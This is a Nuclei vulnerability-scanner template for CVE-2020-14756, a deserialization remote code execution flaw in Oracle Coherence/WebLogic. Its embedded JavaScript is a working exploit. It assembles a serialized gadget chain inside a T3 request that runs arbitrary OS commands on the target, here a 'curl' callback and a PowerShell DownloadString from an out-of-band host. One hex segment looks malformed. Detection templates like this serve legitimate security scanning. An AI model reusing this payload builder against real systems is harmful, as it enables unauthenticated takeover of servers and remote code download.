id: CVE-2020-14756

info:
  name: Oracle Coherence - Remote Code Execution via T3/IIOP Deserialization
  author: princechaddha,kajal1322705
  severity: critical
  description: |
    Oracle Coherence component of Oracle Fusion Middleware (versions 3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0) is vulnerable to remote code execution. An unauthenticated attacker with network access via T3 or IIOP can exploit insecure deserialization in ExternalizableHelper using the AttributeHolder → TopNAggregator → MvelExtractor gadget chain to execute arbitrary code.
  impact: |
    Successful exploitation allows unauthenticated attackers to completely compromise the Oracle WebLogic Server, potentially leading to full system takeover, data theft, and lateral movement within the network.
  remediation: |
    Apply Oracle Critical Patch Update (January 2021 or later). Alternatively, disable T3 and IIOP protocols if not required, or restrict network access to these ports.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-14756
    - https://www.oracle.com/security-alerts/cpujan2021.html
    - https://github.com/Y4er/CVE-2020-14756
    - https://bounty-team.github.io/vulnerability%20analysis/2021/01/27/CVE-2020-14756/
    - https://vulncheck.com/xdb/d5d4e15a3fd1
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-14756
    cwe-id: CWE-502
    epss-score: 0.97435
    epss-percentile: 0.99954
    cpe: cpe:2.3:a:oracle:coherence:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: oracle
    product: coherence
    shodan-query: "WebLogic"
    fofa-query: app="Oracle-WebLogic-Server"
  tags: cve,cve2020,oracle,weblogic,coherence,rce,deserialization,javascript,t3,iiop,kev,intrusive,oast

flow: http(1) && javascript(1)

http:
  - method: GET
    path:
      - '{{BaseURL}}/console/login/LoginForm.jsp'

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains_any(body, "12.1.3.0", "12.2.1.3", "12.2.1.4", "14.1.1.0", "3.7.1.0")'
          - 'contains(body, "WebLogic")'
          - 'status_code == 200'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: version
        part: body
        group: 1
        regex:
          - 'WebLogic\s+Server\s+Version:\s+([0-9.]+)'
        internal: true

javascript:
  - pre-condition: |
      isPortOpen(Host,Port);
    code: |
      const m = require('nuclei/net');
      const address = Host + ":" + Port;

      function strToHex(str) {
        return [...str].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
      }

      function buildMvelPayload(command, isWindows) {
        let mvelExpr;
        if (isWindows) {
          mvelExpr = 'java.lang.Runtime.getRuntime().exec(new String[]{"cmd.exe","/c","' + command + '"});null';
        } else {
          mvelExpr = 'java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","' + command + '"});null';
        }
        const exprHex = strToHex(mvelExpr);
        const exprLen = (mvelExpr.length).toString(16).padStart(4, '0');

        const attributeHolderPrefix = 'aced00057372003b636f6d2e74616e676f736f6c2e636f686572656e63652e736572766c65742e417474726962757465486f6c6465720000000000000001020002490006765f6e4964784c00076d5f6f417474727400124c6a6176612f6c616e672f4f626a6563743b787000000000';
        
        const topNAggregatorPayload = '73720040636f6d2e74616e676f736f6c2e7574696c2e6167677265676174696f6e2e546f704e416767726567617465722450617274696616c526573756c7400000000000000010200014900076d5f634d61787872002f636f6d2e74616e676f736f6c2e7574696c2e6167677265676174696f6e2e5061727469616c526573756c7400000000000000010200007870000000017372001f6a6176612e7574696c2e436f6c6c656374696f6e7324456d7074794d617059364c48c7160788020000787071007e0004';

        const mvelExtractorPrefix = '7372003c636f6d2e74616e676f736f6c2e636f686572656e63652e726573742e7574696c2e657874726163746f722e4d76656c457874726163746f72000000000000000102000249000b6d5f6e546172676574734c00076d5f7345787072';
        const mvelExtractorSuffix = '7400124c6a6176612f6c616e672f537472696e673b78700000000074' + exprLen + exprHex;

        return attributeHolderPrefix + topNAggregatorPayload + mvelExtractorPrefix + mvelExtractorSuffix;
      }

      function buildT3Request(payloadHex) {
        const t3Header = '0165010101ffffffffffffffff0000007100000ea60000001843c6a2a63985b5af7d63e64383f42a6d92c9e9af0f9472027973720078720178720278700000000c00000002000000000000000000000001007070707070700000000c0000000200000000000000000000000001007006fe010000';
        
        const weblogicClassTable = 'aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078';

        const fullPayload = t3Header + weblogicClassTable + 'fe010000' + payloadHex;
        
        const payloadLen = (fullPayload.length / 2).toString(16).padStart(8, '0');
        
        return payloadLen + fullPayload;
      }

      const t3Handshake = '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a';

      let conn = m.Open('tcp', address);
      conn.SendHex(t3Handshake);
      let resp = conn.RecvString();

      if (resp.indexOf('HELO') !== -1) {
        const linux_cmd = "curl " + oast;
        const mvelPayload = buildMvelPayload(linux_cmd, false);
        const t3Request = buildT3Request(mvelPayload);
        
        conn.SendHex(t3Request);
        let exploitResp = conn.RecvString();
        Export("response", "T3 Response: " + resp + " | Exploit sent");
      }
      conn.Close();

      let conn2 = m.Open('tcp', address);
      conn2.SendHex(t3Handshake);
      let resp2 = conn2.RecvString();
      
      if (resp2.indexOf('HELO') !== -1) {
        const windows_cmd = "powershell.exe -nop -ep bypass -c (New-Object Net.WebClient).DownloadString('" + oast + "')";
        const mvelPayloadWin = buildMvelPayload(windows_cmd, true);
        const t3RequestWin = buildT3Request(mvelPayloadWin);
        
        conn2.SendHex(t3RequestWin);
        conn2.RecvString();
      }
      conn2.Close();

    args:
      Host: "{{Host}}"
      Port: 7001
      oast: "{{interactsh-url}}"

    matchers:
      - type: dsl
        dsl:
          - "success == true"
          - "contains(response, 'HELO')"
          - "contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')"
        condition: and
